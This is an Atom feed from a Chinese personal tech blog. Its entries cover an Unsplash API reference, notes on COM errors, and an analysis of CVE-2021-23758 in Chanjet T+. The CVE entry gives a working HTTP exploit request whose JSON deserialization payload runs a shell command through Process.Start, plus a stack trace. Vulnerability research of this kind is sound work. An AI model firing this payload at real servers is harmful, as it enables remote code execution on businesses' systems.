<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>oone</title>
  
  <subtitle>固执无罪，梦想无价 | Coding For Knowledge</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-04-18T08:12:21.821Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>mingming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【POC】POC 索引</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90POC%E3%80%91POC%20%E7%B4%A2%E5%BC%95/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90POC%E3%80%91POC%20%E7%B4%A2%E5%BC%95/</id>
    <published>2024-04-17T16:00:00.000Z</published>
    <updated>2024-04-18T08:12:21.821Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：POC 引路</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><p>[toc]</p><h2 id="已整理"><a href="#已整理" class="headerlink" title="已整理"></a>已整理</h2><h4 id="CVE-2021-23758-畅捷通反序列化"><a href="#CVE-2021-23758-畅捷通反序列化" class="headerlink" title="CVE-2021-23758 畅捷通反序列化"></a>CVE-2021-23758 畅捷通反序列化</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/" title="【CVE-2021-23758】Ajax .NET Professional 中的RCE 漏洞">【CVE-2021-23758】Ajax .NET Professional 中的RCE 漏洞</a><h4 id="QVD-2021-13612-畅捷通SQL注入"><a href="#QVD-2021-13612-畅捷通SQL注入" class="headerlink" title="QVD-2021-13612 畅捷通SQL注入"></a>QVD-2021-13612 畅捷通SQL注入</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/" title="【QVD-2023-13612】畅捷通T+ SQL 注入漏洞">【QVD-2023-13612】畅捷通T+ SQL 注入漏洞</a><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：POC 引路&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>【手册】UnSplash 图源API查询手册</title>
    <link href="http://example.com/E_%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91UnSplash%20%E5%9B%BE%E6%BA%90API%E6%9F%A5%E8%AF%A2%E6%89%8B%E5%86%8C/"/>
    <id>http://example.com/E_%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91UnSplash%20%E5%9B%BE%E6%BA%90API%E6%9F%A5%E8%AF%A2%E6%89%8B%E5%86%8C/</id>
    <published>2024-04-16T16:00:00.000Z</published>
    <updated>2024-04-17T08:10:14.795Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：UnSplash 接口快速查询手册</p></blockquote><span id="more"></span><h3 id="通用接口"><a href="#通用接口" class="headerlink" title="通用接口"></a>通用接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/1280x640/?Technology</span><br></pre></td></tr></table></figure><p>支持的分类有： <a href="https://mani-unsplash-clone.netlify.app/s/wallaper">Wallpaper</a>、<a href="https://mani-unsplash-clone.netlify.app/s/nature">Nature</a>、<a href="https://mani-unsplash-clone.netlify.app/s/people">People</a>、<a href="https://mani-unsplash-clone.netlify.app/s/architecture">Architecture</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Events">Events</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Business">Busines</a>、<a href="https://mani-unsplash-clone.netlify.app/s/Experimental">Experimental</a>、<a href="https://mani-unsplash-clone.netlify.app/s/fashion">Fashion</a>、<a href="https://mani-unsplash-clone.netlify.app/s/film">Film</a>、<a href="https://mani-unsplash-clone.netlify.app/s/health">Health</a>、<a href="https://mani-unsplash-clone.netlify.app/s/technology">Technology</a>、<a href="https://mani-unsplash-clone.netlify.app/s/travel">Travel</a>、<a href="https://mani-unsplash-clone.netlify.app/s/textures">Textures</a>、<a href="https://mani-unsplash-clone.netlify.app/s/animals">Animals</a>、<a href="https://mani-unsplash-clone.netlify.app/s/food">Food</a>、<a href="https://mani-unsplash-clone.netlify.app/s/athletics">Athletics</a>、<a href="https://mani-unsplash-clone.netlify.app/s/spirituality">Spirituality</a>、<a href="https://mani-unsplash-clone.netlify.app/s/arts">Arts</a>、<a href="https://mani-unsplash-clone.netlify.app/s/history">History</a></p><h2 id="随机图片"><a href="#随机图片" class="headerlink" title="随机图片"></a>随机图片</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/random</span><br></pre></td></tr></table></figure><h2 id="指定用户"><a href="#指定用户" class="headerlink" title="指定用户"></a>指定用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/user/&#123;USERNAME&#125;</span><br></pre></td></tr></table></figure><p>指定尺寸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://source.unsplash.com/random/&#123;WIDTH&#125;x&#123;HEIGHT&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------</span><br><span class="line">https://source.unsplash.com/random/1280X960</span><br><span class="line">https://source.unsplash.com/random/800X600</span><br><span class="line">https://source.unsplash.com/random/2560X1920</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：UnSplash 接口快速查询手册&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="E_手册" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/"/>
    
    <category term="个人配置" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="手册" scheme="http://example.com/tags/%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>【COM】开发经验整理</title>
    <link href="http://example.com/A_OS/Windows/COM/%E3%80%90COM%E3%80%91%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E6%95%B4%E7%90%86/"/>
    <id>http://example.com/A_OS/Windows/COM/%E3%80%90COM%E3%80%91%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E6%95%B4%E7%90%86/</id>
    <published>2024-04-16T16:00:00.000Z</published>
    <updated>2024-04-18T01:12:39.111Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：开发中遇到的 COM 异常和相关文章整理</p></blockquote><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>COM+ 线程模型</li></ol><h2 id="文章整理"><a href="#文章整理" class="headerlink" title="文章整理"></a>文章整理</h2><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/component-services-portal">COM+（组件服务） - Win32 apps | Microsoft Learn</a><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/com--contexts-and-threading-models">COM+ 上下文和线程模型 - Win32 apps | Microsoft Learn</a><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/cossdk/com--threading-models">COM+ 线程模型 - Win32 apps | Microsoft Learn</a></li></ol></li></ol></li></ol><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="创建对象异常"><a href="#创建对象异常" class="headerlink" title="创建对象异常"></a>创建对象异常</h3><h4 id="CoinitializeEx-返回-0x80010106"><a href="#CoinitializeEx-返回-0x80010106" class="headerlink" title="CoinitializeEx 返回 0x80010106"></a>CoinitializeEx 返回 0x80010106</h4><p>关键字：<strong>COINIT_MULTITHREADED</strong> 、<strong>COINIT_APARTMENTTHREADED</strong> </p><p><a href="https://blog.csdn.net/guo_lei_lamant/article/details/123431041">CoInitializeEx返回 “0x80010106“ 或者 “RPC_E_CHANGED_MODE“-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：开发中遇到的 COM 异常和相关文章整理&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="COM" scheme="http://example.com/categories/A-OS/Windows/COM/"/>
    
    
    <category term="COM" scheme="http://example.com/tags/COM/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2021-23758】Ajax .NET Professional 中的RCE 漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-04-15T16:00:00.000Z</published>
    <updated>2024-04-18T08:12:38.050Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述： CVE-2021-23758 Ajax.NET Professional 中的RCE 漏洞 分析及说明</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>Ajax.NET Professional (AjaxPro)是最先把AJAX技术应用在微软.NET环境下框架之一，具有部署简单、使用方便、运行高效等特点； 该框架能够创建一个代理类且可以使客户端的JS代码实现调用服务端的方法，并能返回各种在.NET里使用的类型；使用该框架和直接使用.NET基本无差别。</p><p>该漏洞是由于AjaxPro开源组件.NET Class Handler存在对输入数据限制检查不严格引起的；该AjaxPro框架在JavaScriptDeserializer.DeserializeFromJson函数反序列化过程中，如果通过<code>__type</code>获取的<code>Type</code>对象且可对其<code>Type</code>对象修改，攻击者可利用该漏洞在目标主机上执行任意代码。</p><p>详见后文分析。</p><h2 id="受影响软件"><a href="#受影响软件" class="headerlink" title="受影响软件"></a>受影响软件</h2><h3 id="畅捷通-T-GetStoreWarehouseByStore-反序列化漏洞"><a href="#畅捷通-T-GetStoreWarehouseByStore-反序列化漏洞" class="headerlink" title="畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞"></a>畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞</h3><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>T+13.0、T+16.0</p><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>分析内容在<a href="#%E5%A0%86%E6%A0%88">堆栈</a>章节</p><p>漏洞主要是因为<code>ajaxPro</code>组件存在 <code> CVE-2021-23758</code>，但是这个漏洞有个要求是传输的参数类型必须是 <code>object</code></p><p>通过反编译</p><p><code>App_Code.dll</code> 的 <code>Ufida.T.CodeBehind._PriorityLevel </code>中 <code>GetStoreWarehouseByStore</code> 方法满足这个要求</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416102037475.png" class="" title="image-20240416102037475"><p>可以看到 <code>GetStoreWarehouseByStore</code> 由<code>[AjaxMethod]</code>修饰，接收一个 <code>object</code> 类型的参数 <code>storeID</code></p><p>所以路径就是</p><p><code>/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore</code></p><p>&#x2F;tplus 是 nginx 的映射路径，&#x2F;ajaxpro&#x2F;* 则是 web.config 中定义的 ajaxPro 组件处理路径</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>执行 POC 会在 tplus 目录下生成 testwhoami.txt 文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">X-Ajaxpro-Method: GetStoreWarehouseByStore</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: close</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 597</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;storeID&quot;:&#123;</span><br><span class="line">    &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,</span><br><span class="line">    &quot;MethodName&quot;:&quot;Start&quot;,</span><br><span class="line">    &quot;ObjectInstance&quot;:&#123;</span><br><span class="line">        &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,</span><br><span class="line">        &quot;StartInfo&quot;: &#123;</span><br><span class="line">            &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,</span><br><span class="line">            &quot;FileName&quot;:&quot;cmd&quot;, &quot;Arguments&quot;:&quot;/c whoami &gt; testwhoami.txt&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416155119279.png" class="" title="执行结果"><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>如上所示POC，可以看到在执行 Arguments 时，ping 命令调用到了 <code>System.Diagnostics.Process.Start</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> System.dll!System.Diagnostics.Process.Start() (IL=0x0000, Native=0x09963278+0x8)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL=epilog, Native=0x6A109B90+0xCA)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E)</span><br><span class="line"> mscorlib.dll!System.RuntimeType.InvokeMember(string name, System.Reflection.BindingFlags bindingFlags, System.Reflection.Binder binder, object target, object[] providedArgs, System.Reflection.ParameterModifier[] modifiers, System.Globalization.CultureInfo culture, string[] namedParams) (IL≈0x073D, Native=0x6A0CE270+0xAC8)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(out System.Exception e) (IL≈0x0025, Native=0x09963000+0x82)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.QueryWorker(object obj) (IL≈0x008C, Native=0x09962750+0xF5)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.BeginQuery() (IL=epilog, Native=0x03A4FE18+0xC8)</span><br><span class="line"> PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.ObjectInstance.set(object value) (IL=epilog, Native=0x09962DB8+0x9B)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL≈0x0016, Native=0x6A109B90+0x61)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] index, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A0EF6E0+0x65)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, object[] index) (IL=epilog, Native=0x6A0EF6C0+0x18)</span><br><span class="line">&gt;AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) (IL≈0x015E, Native=0x03A67FF8+0x311)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) (IL≈0x0151, Native=0x00CF5D30+0x2E6)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() (IL≈0x0180, Native=0x12CA1F98+0x290)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (IL≈0x01F6, Native=0x12CA0040+0x3B8)</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x12C7FA58+0x2C)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈0x018D, Native=0x12A84DC0+0x305)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x0E35F2A8+0x6E)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (IL≈0x0015, Native=0x0E35F070+0x4A)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ApplicationStepManager.ResumeSteps(System.Exception error) (IL≈0x00F6, Native=0x0E35D228+0x1C7)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(System.Web.HttpContext context, System.AsyncCallback cb, object extraData) (IL=0x005C, Native=0x0E35CC68+0xDC)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest wr) (IL≈0x015B, Native=0x06F5CCF0+0x29B)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A7C0+0x4F)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A540+0x31)</span><br><span class="line"> Chanjet.TP.WebServer.dll!Mono.WebServer.MonoWorkerRequest.ProcessRequest() (IL≈0x000F, Native=0x06F59E20+0x37)</span><br><span class="line"> Chanjet.TP.WebServer.dll!Mono.WebServer.BaseApplicationHost.ProcessRequest(Mono.WebServer.MonoWorkerRequest mwr) (IL≈0x002A, Native=0x06F59C38+0x5E)</span><br><span class="line"> Chanjet.TP.WebServer.FastCgi.exe!Mono.WebServer.FastCgi.ApplicationHost.ProcessRequest(Mono.WebServer.FastCgi.Responder responder) (IL=0x0055, Native=0x06F53E50+0x10D)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.StackBuilderSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL=???, Native=0x6A0D42B0+0x1F4)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.ServerObjectTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0048, Native=0x6A0D4238+0x67)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Messaging.ServerContextTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x004F, Native=0x6A0D413C+0x8B)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessageCallback(object[] args) (IL≈0x0059, Native=0x6A0D3E94+0x98)</span><br><span class="line"> mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x001F, Native=0x6A0D3D40+0xA1)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL≈0x0042, Native=0x6A0EAF38+0x93)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0047, Native=0x6A0D2F50+0xF4)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatchCallback(object[] args) (IL≈0x0016, Native=0x6A0D77EC+0x84)</span><br><span class="line"> mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD)</span><br><span class="line"> [程序域转换]</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0002, Native=0x6A0D2E5C+0x7A)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0053, Native=0x6A0D24AC+0x9A)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink ms, System.Runtime.Remoting.Messaging.IMessage reqMsg, System.Runtime.Remoting.Contexts.ArrayWithSize proxySinks, System.Threading.Thread currentThread, System.Runtime.Remoting.Contexts.Context currentContext, bool bSkippingContextChain) (IL≈0x003A, Native=0x6A0D22EC+0x51)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.InternalInvoke(System.Runtime.Remoting.Messaging.IMethodCallMessage reqMcmMsg, bool useDispatchMessage, int callType) (IL=???, Native=0x6A0D2070+0x1DE)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.Invoke(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL=epilog, Native=0x6A0D2000+0x69)</span><br><span class="line"> mscorlib.dll!System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(ref System.Runtime.Remoting.Proxies.MessageData msgData, int type) (IL≈0x0155, Native=0x6A0D1DA0+0xF4)</span><br><span class="line"> Chanjet.TP.WebServer.FastCGI.exe!Mono.WebServer.FastCgi.Responder.Process() (IL=0x0068, Native=0x039C3988+0x162)</span><br><span class="line"> Chanjet.TP.WebServer.FastCGI.exe!Mono.FastCgi.ResponderRequest.Worker(object state) (IL≈0x0002, Native=0x039C37C8+0x4B)</span><br><span class="line"> mscorlib.dll!System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(object state) (IL=epilog, Native=0x6A0F0960+0x44)</span><br><span class="line"> mscorlib.dll!System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL≈0x0079, Native=0x6A047D70+0xC4)</span><br><span class="line"> mscorlib.dll!System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL=epilog, Native=0x6A047D50+0x17)</span><br><span class="line"> mscorlib.dll!System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem() (IL=epilog, Native=0x6A0F09B0+0x45)</span><br><span class="line"> mscorlib.dll!System.Threading.ThreadPoolWorkQueue.Dispatch() (IL=0x00A4, Native=0x6A0E1920+0x19D)</span><br><span class="line"> mscorlib.dll!System.Threading._ThreadPoolWaitCallback.PerformWaitCallback() (IL=epilog, Native=0x6A0E1910+0xB)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上所示一大堆，只需要关注其中的几个就可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type)</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type)</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() 